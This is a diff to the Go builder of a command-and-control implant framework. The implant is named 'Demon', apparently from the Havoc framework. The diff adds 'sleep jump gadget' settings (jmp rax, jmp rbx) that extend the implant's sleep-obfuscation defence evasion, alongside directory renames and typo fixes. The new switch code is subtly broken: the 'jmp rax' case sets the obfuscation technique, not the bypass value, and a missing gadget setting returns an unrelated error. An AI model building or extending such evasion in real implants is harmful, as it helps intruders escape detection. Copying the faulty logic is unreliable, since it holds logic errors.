@@ -44,6 +44,12 @@ const (
 )
 
 const (
+	SLEEPOBF_BYPASS_NONE   = 0
+	SLEEPOBF_BYPASS_JMPRAX = 1
+	SLEEPOBF_BYPASS_JMPRBX = 2
+)
+
+const (
 	PROXYLOADING_NONE             = 0
 	PROXYLOADING_RTLREGISTERWAIT  = 1
 	PROXYLOADING_RTLCREATETIMER   = 2
@@ -139,15 +145,14 @@ func NewBuilder(config BuilderConfig) *Builder {
 	builder.config.Arch = ARCHITECTURE_X64
 
 	builder.compilerOptions.SourceDirs = []string{
-		"Source/Core",
-		"Source/Crypt",
-		"Source/Inject",
-		"Source/Loader",
-		"Source/Asm",
+		"src/core",
+		"src/crypt",
+		"src/inject",
+		"src/asm",
 	}
 
 	builder.compilerOptions.IncludeDirs = []string{
-		"Include",
+		"include",
 	}
 
 	/*
@@ -194,9 +199,9 @@ func NewBuilder(config BuilderConfig) *Builder {
 		}
 	}
 
-	builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"
-	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
-	builder.compilerOptions.Main.Svc = "Source/Main/MainSvc.c"
+	builder.compilerOptions.Main.Dll = "src/main/MainDll.c"
+	builder.compilerOptions.Main.Exe = "src/main/MainExe.c"
+	builder.compilerOptions.Main.Svc = "src/main/MainSvc.c"
 
 	builder.compilerOptions.Config = config
 
@@ -333,7 +338,7 @@ func (b *Builder) Build() bool {
 			}
 		}
 	}
-	CompileCommand += "Source/Demon.c "
+	CompileCommand += "src/Demon.c "
 
 	// add include directories
 	for _, dir := range b.compilerOptions.IncludeDirs {
@@ -516,9 +521,9 @@ func (b *Builder) Patch(ByteArray []byte) []byte {
 		if b.ProfileConfig.ReplaceStringsX64 != nil {
 			for old, _ := range b.ProfileConfig.ReplaceStringsX64 {
 				new := []byte(b.ProfileConfig.ReplaceStringsX64[old])
-				// make sure they are the same lenght
+				// make sure they are the same length
 				if len(new) < len(old) {
-					new = append(new, bytes.Repeat([]byte{0}, len(old) - len(new))...)
+					new = append(new, bytes.Repeat([]byte{0}, len(old)-len(new))...)
 				}
 				if len(new) > len(old) {
 					logger.Error(fmt.Sprintf("invalid replacement rule, new value (%s) can be longer than the old value (%s)", string(new), old))
@@ -537,9 +542,9 @@ func (b *Builder) Patch(ByteArray []byte) []byte {
 		if b.ProfileConfig.ReplaceStringsX86 != nil {
 			for old, _ := range b.ProfileConfig.ReplaceStringsX86 {
 				new := []byte(b.ProfileConfig.ReplaceStringsX86[old])
-				// make sure they are the same lenght
+				// make sure they are the same length
 				if len(new) < len(old) {
-					new = append(new, bytes.Repeat([]byte{0}, len(old) - len(new))...)
+					new = append(new, bytes.Repeat([]byte{0}, len(old)-len(new))...)
 				}
 				if len(new) > len(old) {
 					logger.Error(fmt.Sprintf("invalid replacement rule, new value (%s) can be longer than the old value (%s)", string(new), old))
@@ -563,6 +568,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		ConfigSpawn64      string
 		ConfigSpawn32      string
 		ConfigObfTechnique int
+		ConfigObfBypass    int
 		ConfigProxyLoading = PROXYLOADING_NONE
 		ConfigStackSpoof   = win32.FALSE
 		ConfigSyscall      = win32.FALSE
@@ -723,6 +729,43 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		return nil, errors.New("sleep Obfuscation technique is undefined")
 	}
 
+	if val, ok := b.config.Config["Sleep Jmp Gadget"].(string); ok && len(val) > 0 {
+
+		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
+			switch val {
+			case "jmp rax":
+				ConfigObfTechnique = SLEEPOBF_BYPASS_JMPRAX
+				if !b.silent {
+					b.SendConsoleMessage("Info", "sleep jump gadget \"jmp rax\" has been specified")
+				}
+				break
+
+			case "jmp rbx":
+				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRBX
+				if !b.silent {
+					b.SendConsoleMessage("Info", "sleep jump gadget \"jmp rbx\" has been specified")
+				}
+				break
+
+			default:
+				ConfigObfBypass = SLEEPOBF_BYPASS_NONE
+				if !b.silent {
+					b.SendConsoleMessage("Info", "no sleep jump gadget has been specified")
+				}
+				break
+			}
+		} else {
+			// if no sleep obfuscation technique has been specified then
+			// no jmp gadgets are going to be used.
+			if !b.silent {
+				b.SendConsoleMessage("Info", "sleep jump gadget option ignored")
+			}
+		}
+
+	} else {
+		return nil, errors.New("sleep Obfuscation technique is undefined")
+	}
+
 	if val, ok := b.config.Config["Stack Duplication"].(bool); ok {
 		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
 			if val {
@@ -812,6 +855,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 
 	// bypass techniques
 	DemonConfig.AddInt(ConfigObfTechnique)
+	DemonConfig.AddInt(ConfigObfBypass)
 	DemonConfig.AddInt(ConfigStackSpoof)
 	DemonConfig.AddInt(ConfigProxyLoading)
 	DemonConfig.AddInt(ConfigSyscall)
